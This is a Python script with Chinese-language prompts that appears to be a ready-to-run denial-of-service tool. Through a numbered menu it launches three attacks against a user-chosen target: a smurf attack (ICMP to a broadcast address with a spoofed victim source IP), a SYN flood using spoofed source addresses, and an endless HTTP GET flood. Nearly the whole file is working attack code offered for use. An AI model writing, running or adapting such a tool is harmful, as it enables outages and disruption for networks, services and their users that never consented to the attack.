#导包
import random
from scapy.all import *
import re
import requests
#IP规范
def check_ip(ipAddr):
  compile_ip=re.compile('^(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)$')
  if compile_ip.match(ipAddr):
    pass 
  else:  
    print("瞎输入什么，输IP啊！！")
    return main()
#端口规范
def check_port(port):
    if port.isdigit():
        pass
    else:
        print("端口是数字啊亲！！")
        return main()
#域名规范
pattern = re.compile(
    r'^(([a-zA-Z]{1})|([a-zA-Z]{1}[a-zA-Z]{1})|'
    r'([a-zA-Z]{1}[0-9]{1})|([0-9]{1}[a-zA-Z]{1})|'
    r'([a-zA-Z0-9][-_.a-zA-Z0-9]{0,61}[a-zA-Z0-9]))\.'
    r'([a-zA-Z]{2,13}|[a-zA-Z0-9-]{2,30}.[a-zA-Z]{2,3})$'
)
 
def is_valid_domain(domain):
    return True if pattern.match(domain) else False
#smurf
def smurf():
    s = input("请输入IP地址")
    check_ip(s)
    d = input("请输入广播地址")
    check_ip(d)
    pkg1=IP(dst=d,src=s)
    send(pkg1/ICMP(),count=100,verbose=1)
#syn flood
def synFlood(port):
    tgt = input("请输入IP地址")
    check_ip(tgt)
    dPort =port
    srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
    int(dPort)
    for sPort in range(1024,65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort,flags="S")
        packet =ipLayer / tcpLayer 
        send(packet)
#HTTPflood
def HTTPflood():
    agreement="http"
    port="80"
    print("1.自己输入，2.默认")
    num2=int(input("请选择是否输入端口（不输入则默认80）") or 0)
    if num2==1:
            port=input("请输入端口")
            check_port(port)
    else:
            pass
    host="www.liangchichi.com"
    print("1.域名，2.IP")
    num1=int(input("请选择输入域名或者IP"))
    
    if num1==1:
        host=input("请输入域名")
        if is_valid_domain(host):
            while 1:
                        res = requests.get(agreement+"://"+host+":"+port)
                        print(" GET success")
                        print(res)
        else:
            return main()
    elif num1==2:
        host=input("请输入IP")
        check_ip(host)
        while 1:
                res = requests.get(agreement+"://"+host+":"+port)
                print(" GET success")
                print(res)
    else:
            return main()

#主函数
def main():
        while 1:
            print("1.smurf攻击")
            print("2.SYN Flood攻击")
            print("3.HTTP GET Flood攻击")
            print("0.退出工具")
            x = int(input('请输入数字选择功能'))
            if x==1:
                print("smurf")
                smurf()
            elif x==2:
                print('SYN Flood')
                port=input("请输入端口")
                check_port(port)
                synFlood(int(port))

            elif x==3:
                print('HTTPflood')
                HTTPflood()
            elif x==0:
                exit()
            else:
                print("输入错误，麻烦看看提示好吧！！！！")

main()
